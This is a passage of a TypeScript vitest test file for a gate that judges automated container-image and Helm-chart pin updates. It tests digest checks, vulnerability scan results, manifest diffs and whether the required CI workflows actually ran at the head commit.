import { execFileSync } from 'node:child_process';
import { chmodSync, cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { describe, expect, it } from 'vitest';
import type { Chart, Item } from '../apps/factory/src/vulnerabilities/inventory.ts';
import {
  CHECK_WORKFLOW,
  chartForward,
  hashesOf,
  IMAGE_CHECK,
  imagePairs,
  lineChanges,
  listMoves,
  type Move,
  manifestsDiffer,
  moveTitle,
  objectsOf,
  onlyPinsChange,
  type PinMoveIO,
  PLATFORM_CHECK,
  PLATFORM_WORKFLOW,
  PLATFORMS,
  POSTGRES_FILE,
  patchedByTheCheck,
  pinMove,
  type Rewritten,
  type Run,
  ranIt,
  realPinMoveIO,
  removeWork,
  type Scan,
  scansShow,
  staleRecords,
  started,
  TEST_SHARDS,
  type WorkflowRun,
  whatRunsIt,
  workflowsOf,
  ZAP_CHECK,
  ZAP_FILE,
} from './pin-move.ts';
import { readPinMove } from './pin-moves.ts';

// The past pin changes of this repository, replayed as the App's: the same moves, as the pin watch would write them.

const HEAD = 'c'.repeat(40);
const hex = (c: string) => c.repeat(64);
const ZAP = 'ghcr.io/zaproxy/zaproxy';
const zap = (tag: string, d: string) => `${ZAP}:${tag}@sha256:${hex(d)}`;
const FIXED: Scan = { read: true, findings: [{ id: 'CVE-1', pkg: 'openssl', severity: 'HIGH', fixed: true }] };
const CLEAN: Scan = { read: true, findings: [] };

/** git's `--raw` list of the files, and each file whole at both commits, its other lines the same at both. */
function diffOf(lines: { file: string; line: number; before: string; after: string }[], status = 'M', mode = '100644') {
  const paths = [...new Set(lines.map((l) => l.file))];
  const raw = paths.map((f) => `:${mode} ${mode} ${'1'.repeat(40)} ${'2'.repeat(40)} ${status}\t${f}`).join('\n');
  const files = paths.map((path) => {
    const mine = lines.filter((l) => l.file === path);
    const length = Math.max(...mine.map((l) => l.line)) + 2;
    const text = (side: 'before' | 'after') =>
      Array.from({ length }, (_, i) => mine.find((l) => l.line === i + 1)?.[side] ?? `  # line ${i + 1}`).join('\n');
    return { path, before: text('before'), after: text('after') };
  });
  return { raw, files };
}

interface Case {
  base: Item[];
  head: Item[];
  lines: { file: string; line: number; before: string; after: string }[];
  io?: Partial<PinMoveIO>;
}

const run = (name: string, conclusion: string | null = 'success', more: Partial<Run> = {}): Run => ({
  id: 10,
  name,
  head_sha: HEAD,
  status: 'completed',
  conclusion,
  app: { slug: 'github-actions' },
  workflow: name === PLATFORM_CHECK ? PLATFORM_WORKFLOW : CHECK_WORKFLOW,
  ...more,
});
/** Every check that runs a pin, each a success at the head from its own workflow. */
const ALL_RAN = () => [run(ZAP_CHECK), run(IMAGE_CHECK), ...TEST_SHARDS.map((name) => run(name)), run(PLATFORM_CHECK)];

/** A reader of the case's answers: every fact the rule reads, each passing unless the case says otherwise. */
function reader({ base, head, lines, io = {} }: Case): PinMoveIO {
  const { raw, files } = diffOf(lines);
  return {
    diff: async () => ({ raw, files }),
    list: async (side) => (side === 'base' ? base : head),
    unlisted: async () => [],
    tags: async (repository) =>
      repository.endsWith('k8s-sidecar')
        ? ['2.11.2', '2.14.3']
        : ['2.16.0', '2.17.0', '2.17.1-rc1', '18.6-alpine3.24', '18.7-alpine3.24', '19.0-alpine3.24'],
    digest: async (reference) =>
      ({
        [`${ZAP}:2.17.0`]: `sha256:${hex('b')}`,
        [`${ZAP}:2.16.0`]: `sha256:${hex('9')}`,
        'postgres:18.7-alpine3.24': `sha256:${hex('e')}`,
        'postgres:18.6-alpine3.24': `sha256:${hex('d')}`,
        'node:24.22.2-trixie-slim': `sha256:${hex('f')}`,
        'kiwigrid/k8s-sidecar:2.14.3': `sha256:${hex('5')}`,
      })[reference] ?? `sha256:${hex('0')}`,
    chartVersions: async () => ['13.5.0', '13.7.0', '14.3.1'],
    render: async (side, chart) => rendered(side, chart),
    // The overlay runs Postgres, and the admission policy copies its digest: both move with the pin, and nothing else.
    overlay: async (side) => {
      const pg = lines.some((l) => l.file === POSTGRES_FILE) && side === 'head' ? PG_B : PG_A;
      return `kind: StatefulSet\nmetadata:\n  name: postgres\nspec:\n  template:\n    spec:\n      containers:\n        - image: ${pg}\n---\nkind: ImageValidatingPolicy\nmetadata:\n  name: postgres-images\nallowed: ['${pg.split('@')[1]}']\n`;
    },
    hashes: async () => ({ 'admission-refusals': 'x', 'mark-refusals': 'y' }),
    scan: async (reference) =>
      reference.endsWith(hex('a')) || reference.endsWith(hex('d')) || reference.includes('2.11.2') ? FIXED : CLEAN,
    runs: async () => ALL_RAN(),
    patched: async () => [],
    ...io,
  };
}

const GRAFANA: Chart = {
  repo: 'https://grafana.github.io/helm-charts',
  chart: 'grafana',
  version: '13.5.0',
  release: 'grafana',
  values: ['deploy/base/telemetry/values/grafana.yaml'],
};

function rendered(side: 'base' | 'head', chart: Chart) {
  const sidecar =
    side === 'base'
      ? `kiwigrid/k8s-sidecar:2.11.2@sha256:${hex('4')}`
      : `kiwigrid/k8s-sidecar:2.14.3@sha256:${hex('5')}`;
  const grafana = chart.version === '13.5.0' ? 'grafana/grafana:12.0.0' : 'grafana/grafana:12.0.1';
  return [
    'kind: Deployment',
    'metadata:',
    '  name: grafana',
    '  labels:',
    `    helm.sh/chart: grafana-${chart.version}`,
    'spec:',
    '  replicas: 1',
    '  template:',
    '    spec:',
    '      containers:',
    `        - image: ${grafana}`,
    `        - image: ${sidecar}`,
  ].join('\n');
}

const zapItem = (image: string): Item => ({ kind: 'workflow', name: image, file: ZAP_FILE, line: 32, image });
const zapLine = (image: string) => `  '${image}';`;
const ZAP_LINE = { file: ZAP_FILE, line: 32, before: zapLine(zap('2.17.0', 'a')), after: zapLine(zap('2.17.0', 'b')) };
/** ZAP's digest (#993): the same tag, at the digest it names now. */
const ZAP_CASE: Case = {
  base: [zapItem(zap('2.17.0', 'a'))],
  head: [zapItem(zap('2.17.0', 'b'))],
  lines: [ZAP_LINE],
};
const zapTo = (image: string, io?: Partial<PinMoveIO>): Case => ({
  base: ZAP_CASE.base,
  head: [zapItem(image)],
  lines: [{ file: ZAP_FILE, line: 32, before: zapLine(zap('2.17.0', 'a')), after: zapLine(image) }],
  ...(io ? { io } : {}),
});

const PG_A = `postgres:18.6-alpine3.24@sha256:${hex('d')}`;
const PG_B = `postgres:18.7-alpine3.24@sha256:${hex('e')}`;
const pgItem = (image: string): Item => ({ kind: 'third-party', name: image, file: POSTGRES_FILE, line: 21, image });
/** A Postgres digest, as the App would move it: the pin's line alone. */
const POSTGRES: Case = {
  base: [pgItem(PG_A)],
  head: [pgItem(PG_B)],
  lines: [{ file: POSTGRES_FILE, line: 21, before: `          image: ${PG_A}`, after: `          image: ${PG_B}` }],
};

const grafanaItem = (version: string, digest: string): Item => ({
  kind: 'chart',
  name: 'grafana',
  file: 'deploy/base/telemetry/grafana.yaml',
  line: 12,
  chart: { ...GRAFANA, version },
  pins: [{ file: 'deploy/base/telemetry/values/grafana.yaml', line: 32, digest: `sha256:${hex(digest)}` }],
});
const SIDECAR_LINE = (tag: string, d: string) => `    tag: ${tag}@sha256:${hex(d)}`;
const SIDECAR_CHANGE = {
  file: 'deploy/base/telemetry/values/grafana.yaml',
  line: 32,
  before: SIDECAR_LINE('2.11.2', '4'),
  after: SIDECAR_LINE('2.14.3', '5'),
};
/** Grafana's sidecar (#995), one of its two values, as the App would move it. */
const SIDECAR: Case = {
  base: [grafanaItem('13.5.0', '4')],
  head: [grafanaItem('13.5.0', '5')],
  lines: [SIDECAR_CHANGE],
};

const judged = (c: Case) => pinMove(reader(c), HEAD);
const reasonOf = async (c: Case) => {
  const result = await judged(c);
  return 'reason' in result ? result.reason : `passed: ${result.move.name}`;
};

describe('a pin move, replayed as the App would make it', () => {
  it("passes ZAP's digest (#993): the tag's digest now, a fix gone, nothing new, and ZAP scan ran it", async () => {
    const result = await judged(ZAP_CASE);
    expect(result).toMatchObject({ move: { name: ZAP, what: 'image' }, ran: [ZAP_CHECK], fixed: 1 });
  });

  it("passes a Dockerfile stage's move to the newest on its line, which image builds ran", async () => {
    const from = `node:24.21.0-trixie-slim@sha256:${hex('1')}`;
    const to = `node:24.22.2-trixie-slim@sha256:${hex('f')}`;
    const item = (image: string): Item => ({
      kind: 'dockerfile',
      name: image,
      file: 'apps/factory/Dockerfile',
      line: 3,
      image,
    });
    const c: Case = {
      base: [item(from)],
      head: [item(to)],
      lines: [
        { file: 'apps/factory/Dockerfile', line: 3, before: `FROM ${from} AS base`, after: `FROM ${to} AS base` },
      ],
      io: {
        tags: async () => ['24.21.0-trixie-slim', '24.22.2-trixie-slim', '25.0.0-trixie-slim', '24.22.2-alpine3.24'],
        scan: async (reference) => (reference === from ? FIXED : CLEAN),
      },
    };
    expect(await judged(c)).toMatchObject({ ran: [IMAGE_CHECK], fixed: 1 });
  });

  it('holds a Postgres digest while it stales the admission record, and passes it once it does not, on tests', async () => {
    const stale = { hashes: async (side: 'base' | 'head') => ({ 'admission-refusals': side, 'mark-refusals': 'y' }) };
    expect(await reasonOf({ ...POSTGRES, io: stale })).toMatch(/^it stales deploy\/test\/admission-refusals\.json/);
    expect(await judged(POSTGRES)).toMatchObject({ ran: [...TEST_SHARDS, PLATFORM_CHECK], fixed: 1 });
  });

  it("passes a sidecar's value once platform made a cluster from the change at its head (#995)", async () => {
    const result = await judged(SIDECAR);
    expect(result).toMatchObject({ ran: [PLATFORM_CHECK], fixed: 1 });
    expect('move' in result && moveTitle(result)).toMatch(/, platform ran it$/);
  });

  it("holds a sidecar's value while platform has not made a cluster from the change at its head", async () => {
    const at = (runs: Run[]) => reasonOf({ ...SIDECAR, io: { runs: async () => runs } });
    const others = ALL_RAN().filter((r) => r.name !== PLATFORM_CHECK);
    expect(await at(others)).toBe('platform has not run at ccccccc');
    expect(await at([...others, run(PLATFORM_CHECK, null, { status: 'in_progress' })])).toBe(
      'platform has not finished at ccccccc',
    );
    expect(await at([...others, run(PLATFORM_CHECK, 'skipped')])).toBe(
      'platform at ccccccc is skipped, not a success: it made no cluster from the change',
    );
    for (const conclusion of ['failure', 'cancelled', 'timed_out', 'neutral'])
      expect(await at([...others, run(PLATFORM_CHECK, conclusion)])).toBe(
        `platform at ccccccc is ${conclusion}, not a success: something must run it`,
      );
    // Its latest attempt counts: a success re-run into a failure holds, a failure re-run into a success passes.
    const failedLast = [run(PLATFORM_CHECK, 'success', { id: 1 }), run(PLATFORM_CHECK, 'failure', { id: 2 })];
    expect(await at([...others, ...failedLast])).toMatch(/is failure, not a success/);
    // Attempts of one workflow run share its check suite: a re-run that succeeds counts.
    const passedLast = [
      run(PLATFORM_CHECK, 'failure', { id: 1, check_suite: { id: 5 } }),
      run(PLATFORM_CHECK, 'success', { id: 2, check_suite: { id: 5 } }),
    ];
    expect(await at([...others, ...passedLast])).toBe(
      "passed: grafana's value at deploy/base/telemetry/values/grafana.yaml:32",
    );
    // Another head's success, another app's, or a job named `platform` in any workflow but platform.yml proves nothing.
    expect(await at([...others, run(PLATFORM_CHECK, 'success', { head_sha: 'd'.repeat(40) })])).toBe(
      'platform has not run at ccccccc',
    );
    expect(await at([...others, run(PLATFORM_CHECK, 'success', { app: { slug: 'mrogan-software-factory' } })])).toBe(
      'platform has not run at ccccccc',
    );
    expect(await at([...others, run(PLATFORM_CHECK, 'success', { workflow: CHECK_WORKFLOW })])).toMatch(
      /^platform at ccccccc ran in no run of \.github\/workflows\/platform\.yml/,
    );
    expect(await at([...others, run(PLATFORM_CHECK, 'success', { workflow: null })])).toMatch(
      /^platform at ccccccc ran in no run of \.github\/workflows\/platform\.yml/,
    );
    // A later forged success beside a failed real one does not hide the failure.
    const forged = [
      run(PLATFORM_CHECK, 'failure', { id: 1 }),
      run(PLATFORM_CHECK, 'success', { id: 2, workflow: '.github/workflows/other.yml' }),
    ];
    expect(await at([...others, ...forged])).toMatch(/is failure, not a success/);
  });

  it('holds Postgres until both tests and platform ran it, and a third-party image or a chart in deploy/ on platform', async () => {
    const noPlatform = ALL_RAN().filter((r) => r.name !== PLATFORM_CHECK);
    expect(await reasonOf({ ...POSTGRES, io: { runs: async () => noPlatform } })).toBe(
      'platform has not run at ccccccc',
    );
    const noTests = ALL_RAN().filter((r) => !r.name.startsWith('tests'));
    expect(await reasonOf({ ...POSTGRES, io: { runs: async () => noTests } })).toBe(
      'tests (1/3) has not run at ccccccc',
    );
    const flagd = (image: string): Move => ({
      what: 'image',
      name: 'ghcr.io/open-feature/flagd',
      kind: 'third-party',
      from: image,
      to: image,
      pins: [
        {
          what: 'image',
          kind: 'third-party',
          item: image,
          place: { file: 'deploy/base/flagd/flagd.yaml', line: 102 },
          from: image,
          to: image,
        },
      ],
    });
    expect(whatRunsIt(flagd('x'))).toEqual({ checks: [PLATFORM_CHECK] });
    const chartMove: Move = {
      what: 'chart',
      name: 'grafana',
      kind: 'chart',
      from: '13.5.0',
      to: '13.7.0',
      pins: [
        {
          what: 'chart',
          kind: 'chart',
          item: 'grafana',
          place: { file: 'deploy/base/telemetry/grafana.yaml', line: 12 },
          from: '13.5.0',
          to: '13.7.0',
        },
      ],
    };
    expect(whatRunsIt(chartMove)).toEqual({ checks: [PLATFORM_CHECK] });
    // A Dockerfile's stage in deploy/ builds an image the cluster runs only once build.yml built it on main.
    const stage: Move = {
      ...flagd('x'),
      kind: 'dockerfile',
      pins: [
        {
          ...(flagd('x').pins[0] as Move['pins'][number]),
          kind: 'dockerfile',
          place: { file: 'deploy/images/tool/Dockerfile', line: 2 },
        },
      ],
    };
    expect(whatRunsIt(stage)).toEqual({
      reason: 'no check at the head runs ghcr.io/open-feature/flagd: nothing shows it ran',
    });
  });

  it('says when a check of the name ran at the head but in no run the gate could tie to its workflow', async () => {
    const others = ALL_RAN().filter((r) => r.name !== PLATFORM_CHECK);
    expect(
      await reasonOf({
        ...SIDECAR,
        io: { runs: async () => [...others, run(PLATFORM_CHECK, 'success', { workflow: null })] },
      }),
    ).toBe(
      'platform at ccccccc ran in no run of .github/workflows/platform.yml for this pull request that the gate could read',
    );
  });

  it('holds an image no running workload starts: platform never pulled it', () => {
    const ref = `kiwigrid/k8s-sidecar:2.14.3@sha256:${hex('5')}`;
    const doc = (kind: string, extra = '') =>
      `apiVersion: v1\nkind: ${kind}\nmetadata:\n  name: x${extra}\nspec:\n  template:\n    spec:\n      containers:\n        - image: ${ref}\n`;
    expect(started(doc('Deployment'), [ref])).toBeUndefined();
    expect(started(`${doc('Job')}---\n${doc('StatefulSet')}`, [ref])).toBeUndefined();
    for (const rendering of [
      doc('Job'),
      doc('CronJob'),
      doc('Deployment', '\n  annotations:\n    helm.sh/hook: pre-delete'),
      doc('Deployment', '\n  annotations:\n    argocd.argoproj.io/hook: PreSync'),
      doc('Deployment').replace('spec:\n', 'spec:\n  replicas: 0\n'),
      'kind: Deployment\nspec:\n  template:\n    spec:\n      containers:\n        - image: another\n',
    ])
      expect(started(rendering, [ref])).toMatch(/^no workload the platform check runs starts kiwigrid\/k8s-sidecar/);
  });

  it('holds a value only a hook runs, with every other condition proved', async () => {
    const hooked: Partial<PinMoveIO> = {
      render: async (side, chart) =>
        rendered(side, chart).replace('  labels:\n', '  annotations:\n    helm.sh/hook: pre-delete\n  labels:\n'),
    };
    expect(await reasonOf({ ...SIDECAR, io: hooked })).toMatch(/^no workload the platform check runs starts/);
  });

  it("holds Kyverno's chart and values for Martin: admission cannot vouch for its own replacement", async () => {
    const kyverno: Case = {
      ...SIDECAR,
      base: SIDECAR.base.map((i) => ({ ...i, name: 'kyverno' })),
      head: SIDECAR.head.map((i) => ({ ...i, name: 'kyverno' })),
    };
    expect(await reasonOf(kyverno)).toBe(
      "Kyverno's own pin: what judges cannot vouch for its replacement, so it is Martin's",
    );
  });

  it('ties each check run to the workflow file its suite ran, of this repository, on a pull request, at its head', () => {
    const wf = (more: Partial<WorkflowRun>): WorkflowRun => ({
      id: 1,
      path: PLATFORM_WORKFLOW,
      event: 'pull_request',
      head_sha: HEAD,
      head_branch: 'factory/pin/x',
      created_at: '2026-11-12T10:00:00Z',
      check_suite_id: 7,
      repository: { full_name: 'o/r' },
      head_repository: { full_name: 'o/r' },
      pull_requests: [{ number: 9, base: { ref: 'main' } }],
      ...more,
    });
    const { workflow: _, ...check } = run(PLATFORM_CHECK, 'success', { check_suite: { id: 7 } });
    const of = (workflows: WorkflowRun[], c: Run = check, open = true) =>
      workflowsOf([c], workflows, 'o/r', { number: 9, ref: 'factory/pin/x', created: '2026-11-12T09:00:00Z', open })[0]
        ?.workflow;
    expect(of([wf({})])).toBe(PLATFORM_WORKFLOW);
    expect(of([wf({ check_suite_id: 8 })])).toBeNull();
    expect(of([])).toBeNull();
    expect(of([wf({})], { ...check, check_suite: null })).toBeNull();
    expect(of([wf({ repository: { full_name: 'x/r' } })])).toBeNull();
    expect(of([wf({ head_repository: { full_name: 'fork/r' } })])).toBeNull();
    expect(of([wf({ head_repository: null })])).toBeNull();
    expect(of([wf({ event: 'merge_group' })])).toBeNull();
    expect(of([wf({ event: 'workflow_dispatch' })])).toBeNull();
    expect(of([wf({ head_sha: 'd'.repeat(40) })])).toBeNull();
    expect(of([wf({ path: '.github/workflows/other.yml' })])).toBe('.github/workflows/other.yml');
    // Run for another pull request at the same head, into another base, or for none while this one is open.
    expect(of([wf({ pull_requests: [{ number: 10, base: { ref: 'main' } }] })])).toBeNull();
    expect(of([wf({ pull_requests: [{ number: 9, base: { ref: 'other' } }] })])).toBeNull();
    expect(of([wf({ pull_requests: [] })])).toBeNull();
    expect(of([wf({ pull_requests: null })])).toBeNull();
    // A replay of a closed pull request by hand: GitHub has emptied the run's list, and nothing names another.
    expect(of([wf({ pull_requests: [] })], check, false)).toBe(PLATFORM_WORKFLOW);
    expect(of([wf({ pull_requests: [{ number: 10, base: { ref: 'other' } }] })], check, false)).toBeNull();
  });

  it("holds Argo CD's chart, which make up installs, and k3s, which waits for Martin", async () => {
    const argocd = (version: string): Item => ({
      kind: 'chart',
      name: 'argocd',
      file: 'Makefile',
      line: 7,
      chart: { repo: 'https://argoproj.github.io/argo-helm', chart: 'argo-cd', version, release: 'argocd', values: [] },
    });
    const io = {
      chartVersions: async () => ['10.9.5', '10.15.0'],
      render: async (_side: 'base' | 'head', chart: Chart) =>
        `kind: Pod\nmetadata:\n  name: argocd\nspec:\n  image: quay.io/argoproj/argocd:${chart.version === '10.9.5' ? 'v3.5.6' : 'v3.6.1'}\n`,
      scan: async (reference: string) => (reference.endsWith('v3.5.6') ? FIXED : CLEAN),
    };
    const chart: Case = {
      base: [argocd('10.9.5')],
      head: [argocd('10.15.0')],
      lines: [{ file: 'Makefile', line: 7, before: 'ARGOCD_CHART := 10.9.5', after: 'ARGOCD_CHART := 10.15.0' }],
      io,
    };
    expect(await reasonOf(chart)).toBe('argocd is installed by make up: a merge does not apply it');
    const k3s = (image: string): Item => ({
      kind: 'k3s',
      name: image,
      file: 'deploy/k3d/cluster.yaml',
      line: 9,
      image,
    });
    const [a, b] = [`rancher/k3s:v1.37.1-k3s1@sha256:${hex('6')}`, `rancher/k3s:v1.37.2-k3s1@sha256:${hex('7')}`];
    const cluster: Case = {
      base: [k3s(a)],
      head: [k3s(b)],
      lines: [{ file: 'deploy/k3d/cluster.yaml', line: 9, before: `image: ${a}`, after: `image: ${b}` }],
      io: {
        tags: async () => ['v1.37.1-k3s1', 'v1.37.2-k3s1'],
        digest: async () => `sha256:${hex('7')}`,
        scan: async (reference) => (reference === a ? FIXED : CLEAN),
      },
    };
    // Whatever the platform check says: every check, platform's too, succeeded at the head.
    expect(await reasonOf(cluster)).toBe(
      "rancher/k3s is the cluster's own: a k3s move waits for Martin, whose cluster moves with it, whatever the platform check says",
    );
  });
});

describe('a pin move holds, each for its one reason', () => {
  it('a second pin in the same change', async () => {
    const c: Case = {
      base: [...ZAP_CASE.base, pgItem(PG_A)],
      head: [...ZAP_CASE.head, pgItem(PG_B)],
      lines: [...ZAP_CASE.lines, ...POSTGRES.lines],
    };
    expect(await reasonOf(c)).toBe(`a second pin in the same change: postgres beside ${ZAP}`);
  });

  it("both sidecars' values in one change are two moves", async () => {
    const loki = (d: string): Item => ({
      ...grafanaItem('13.5.0', d),
      name: 'loki',
      file: 'deploy/base/telemetry/loki.yaml',
      pins: [{ file: 'deploy/base/telemetry/values/loki.yaml', line: 44, digest: `sha256:${hex(d)}` }],
    });
    const c: Case = {
      base: [...SIDECAR.base, loki('4')],
      head: [...SIDECAR.head, loki('5')],
      lines: [
        ...SIDECAR.lines,
        {
          file: 'deploy/base/telemetry/values/loki.yaml',
          line: 44,
          before: SIDECAR_LINE('2.11.2', '4'),
          after: SIDECAR_LINE('2.14.3', '5'),
        },
      ],
    };
    expect(await reasonOf(c)).toMatch(/^a second pin in the same change: loki's value/);
  });

  it('a line that is not a pin, though it changes only a version', async () => {
    const c: Case = {
      ...ZAP_CASE,
      lines: [...ZAP_CASE.lines, { file: ZAP_FILE, line: 40, before: '// ZAP 2.16.0', after: '// ZAP 2.17.0' }],
    };
    expect(await reasonOf(c)).toBe(`${ZAP_FILE}:40 is a line that is not a pin: // ZAP 2.17.0`);
    // Nor is the head rendered to find out: the base's list says which lines are pins.
    const read: string[] = [];
    const io = {
      list: async (side: 'base' | 'head') => {
        read.push(side);
        return side === 'base' ? c.base : c.head;
      },
    };
    await reasonOf({ ...c, io });
    expect(read).toEqual(['base']);
  });

  it("a pin's line that changes another version beside the pin", async () => {
    const line = (image: string, retries: number) => `  '${image}'; const RETRIES = ${retries};`;
    const c: Case = {
      ...ZAP_CASE,
      lines: [{ ...ZAP_LINE, before: line(zap('2.17.0', 'a'), 1), after: line(zap('2.17.0', 'b'), 2) }],
    };
    expect(await reasonOf(c)).toMatch(
      /^apps\/console\/zap\/scan\.ts:32 changes more than ghcr\.io\/zaproxy\/zaproxy's pin/,
    );
  });

  it('another image whose rendered line changes beside a chart value\u2019s move', async () => {
    const io = {
      render: async (side: 'base' | 'head', chart: Chart) =>
        `${rendered(side, chart)}\n        - image: busybox:${side === 'base' ? '1.36' : '1.37'}`,
    };
    expect(await reasonOf({ ...SIDECAR, io })).toBe(
      'the manifests change beyond the image: Deployment grafana at spec.template.spec.containers[2].image',
    );
  });

  it('a line that changes more than a version or a digest', async () => {
    const c: Case = {
      ...ZAP_CASE,
      lines: [{ ...ZAP_LINE, after: zapLine(zap('2.17.0', 'b')).replace('zaproxy:', 'zaproxy2:') }],
    };
    expect(await reasonOf(c)).toMatch(/^apps\/console\/zap\/scan\.ts:32 changes more than a version or a digest/);
  });

  it('a digest that is not the tag’s', async () => {
    expect(await reasonOf(zapTo(zap('2.17.0', 'c')))).toMatch(
      /^a digest that is not the tag's: ghcr\.io\/zaproxy\/zaproxy:2\.17\.0 is sha256:bbbb/,
    );
  });

  it('a move backwards', async () => {
    expect(await reasonOf(zapTo(zap('2.16.0', '9')))).toBe('a move backwards, from 2.17.0 to 2.16.0');
  });

  it('a major', async () => {
    expect(await reasonOf(zapTo(zap('3.0.0', '3')))).toBe('a major, from 2.17.0 to 3.0.0');
  });

  it('a newer tag that is not the newest on the line', async () => {
    const io = { tags: async () => ['2.17.0', '2.17.1', '2.17.2'], digest: async () => `sha256:${hex('8')}` };
    expect(await reasonOf(zapTo(zap('2.17.1', '8'), io))).toBe(
      '2.17.1 is not the newest tag on 2.17.0’s line, 2.17.2'.replace('’', "'"),
    );
  });

  it('a target that brings a new High', async () => {
    const io = {
      scan: async (reference: string) =>
        reference.endsWith(hex('a'))
          ? FIXED
          : { read: true, findings: [{ id: 'CVE-9', pkg: 'zlib', severity: 'HIGH', fixed: false }] },
    };
    expect(await reasonOf({ ...ZAP_CASE, io })).toBe(
      `a target that brings a new HIGH: ${zap('2.17.0', 'b')} (linux/amd64)`,
    );
  });

  it('a move that fixes nothing, and a scan that read nothing', async () => {
    expect(await reasonOf({ ...ZAP_CASE, io: { scan: async () => CLEAN } })).toBe(
      'the scans show no finding with a fix gone: the move fixes nothing',
    );
    const io = {
      scan: async (reference: string) => (reference.endsWith(hex('a')) ? FIXED : { read: false, findings: [] }),
    };
    expect(await reasonOf({ ...ZAP_CASE, io })).toBe(`the scan of ${zap('2.17.0', 'b')} (linux/amd64) read nothing`);
  });

  it('a chart whose manifests change', async () => {
    const io = {
      render: async (side: 'base' | 'head', chart: Chart) =>
        side === 'head' ? rendered(side, chart).replace('replicas: 1', 'replicas: 3') : rendered(side, chart),
    };
    expect(await reasonOf({ ...SIDECAR, io })).toBe(
      'the manifests change beyond the image: Deployment grafana at spec.replicas',
    );
  });

  it('an image the cluster runs whose overlay changes beyond its references', async () => {
    const io = {
      overlay: async (side: 'base' | 'head') =>
        `kind: StatefulSet\nmetadata:\n  name: postgres\nspec:\n  template:\n    spec:\n      containers:\n        - image: ${side === 'base' ? PG_A : PG_B}\n          args: [${side === 'base' ? '--a' : '--b'}]\n`,
    };
    expect(await reasonOf({ ...POSTGRES, io })).toBe(
      'the manifests change beyond the image: StatefulSet postgres at spec.template.spec.containers[0].args[0]',
    );
  });

  it("Trivy's own pin, and Syft's", async () => {
    const trivy = (d: string) => `ghcr.io/aquasecurity/trivy:0.76.2@sha256:${hex(d)}`;
    const item = (image: string): Item => ({
      kind: 'workflow',
      name: image,
      file: 'deploy/images/trivy/Dockerfile',
      line: 9,
      image,
    });
    const c: Case = {
      base: [item(trivy('a'))],
      head: [item(trivy('b'))],
      lines: [
        { file: 'deploy/images/trivy/Dockerfile', line: 9, before: `FROM ${trivy('a')}`, after: `FROM ${trivy('b')}` },
      ],
    };
    expect(await reasonOf(c)).toBe("Trivy's own pin: what judges cannot vouch for its replacement, so it is Martin's");
    const syft = (d: string) => `anchore/syft:v1.57.1@sha256:${hex(d)}`;
    const s: Case = {
      base: [{ ...item(syft('a')), file: 'deploy/images/syft/Dockerfile' }],
      head: [{ ...item(syft('b')), file: 'deploy/images/syft/Dockerfile' }],
      lines: [
        { file: 'deploy/images/syft/Dockerfile', line: 9, before: `FROM ${syft('a')}`, after: `FROM ${syft('b')}` },
      ],
    };
    expect(await reasonOf(s)).toBe("Syft's own pin: what judges cannot vouch for its replacement, so it is Martin's");
  });

  it('a pin under .github/, and one of mise’s files', async () => {
    const workflow = '.github/workflows/check.yml';
    const c: Case = { ...ZAP_CASE, lines: [{ ...ZAP_LINE, file: workflow }] };
    expect(await reasonOf(c)).toBe(
      `it changes ${workflow}: a pin under .github/ is a workflow's, and the App writes none`,
    );
    const mise: Case = { ...ZAP_CASE, lines: [{ ...ZAP_LINE, file: 'mise.lock' }] };
    expect(await reasonOf(mise)).toBe(
      "it changes mise.lock: mise's files move only when someone upgrades the toolchain",
    );
  });

  it('an image of ours, which passes only as an exact pin', async () => {
    const ours = (d: string) => `ghcr.io/the-roganator/cv-software-factory/browser:1@sha256:${hex(d)}`;
    const c: Case = {
      base: [zapItem(ours('a'))],
      head: [zapItem(ours('b'))],
      lines: [{ ...ZAP_LINE, before: zapLine(ours('a')), after: zapLine(ours('b')) }],
    };
    expect(await reasonOf(c)).toMatch(/is an image of ours, which passes only as an exact pin/);
  });

  it('a pin the list does not read at the head', async () => {
    const io = { unlisted: async () => [{ file: 'x.ts', line: 3, reference: `y@sha256:${hex('1')}`, why: 'unread' }] };
    expect(await reasonOf({ ...ZAP_CASE, io })).toMatch(/^the list does not read 1 pin at the head: x\.ts:3/);
  });

  it('the list adding an item, or one at another place', async () => {
    expect(await reasonOf({ ...ZAP_CASE, head: [...ZAP_CASE.head, pgItem(PG_B)] })).toBe(
      'the list has 2 items at the head and 1 at the base: it adds or removes one',
    );
    expect(await reasonOf({ ...ZAP_CASE, head: [{ ...zapItem(zap('2.17.0', 'b')), line: 33 }] })).toMatch(
      /is not at the same place/,
    );
  });

  it('a value with no tag beside its digest', async () => {
    const c: Case = {
      ...SIDECAR,
      lines: [{ ...SIDECAR_CHANGE, before: `    digest: sha256:${hex('4')}`, after: `    digest: sha256:${hex('5')}` }],
    };
    expect(await reasonOf(c)).toMatch(/writes no tag beside its digest to resolve$/);
  });

  it('a check that did not run what the pin runs, was skipped, or failed at its latest attempt', async () => {
    expect(await reasonOf({ ...ZAP_CASE, io: { runs: async () => [] } })).toBe('ZAP scan has not run at ccccccc');
    expect(await reasonOf({ ...ZAP_CASE, io: { runs: async () => [run(ZAP_CHECK, 'skipped')] } })).toBe(
      'ZAP scan at ccccccc is skipped, not a success: something must run it',
    );
    const retried = [run(ZAP_CHECK, 'success', { id: 1 }), run(ZAP_CHECK, 'failure', { id: 2 })];
    expect(await reasonOf({ ...ZAP_CASE, io: { runs: async () => retried } })).toMatch(/is failure, not a success/);
    const foreign = [run(ZAP_CHECK, 'success', { app: { slug: 'mrogan-software-factory' } })];
    expect(await reasonOf({ ...ZAP_CASE, io: { runs: async () => foreign } })).toBe('ZAP scan has not run at ccccccc');
    const elsewhere = [run(ZAP_CHECK, 'success', { head_sha: 'd'.repeat(40) })];
    expect(await reasonOf({ ...ZAP_CASE, io: { runs: async () => elsewhere } })).toBe(
      'ZAP scan has not run at ccccccc',
    );
    const shards = TEST_SHARDS.slice(0, 2).map((name) => run(name));
    expect(await reasonOf({ ...POSTGRES, io: { runs: async () => shards } })).toBe(
      'tests (3/3) has not run at ccccccc',
    );
  });

  it('a fact it could not read: the whole judgement fails, and the gate holds on it', async () => {
    const io = { digest: async () => Promise.reject(new Error('ghcr.io answered 503')) };
    await expect(judged({ ...ZAP_CASE, io })).rejects.toThrow('ghcr.io answered 503');
  });
});

describe("a change's lines", () => {
  it('reads a rewrite of versions and digests, and nothing else', () => {
    expect(onlyPinsChange(zapLine(zap('2.17.0', 'a')), zapLine(zap('2.17.1', 'b')))).toBe(true);
